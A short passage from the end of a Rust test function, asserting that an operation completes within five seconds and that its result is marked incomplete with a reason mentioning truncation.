    assert!(start.elapsed() < std::time::Duration::from_secs(5), "{:?}", start.elapsed());
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("truncated")), "{:?}", r.reasons);
}
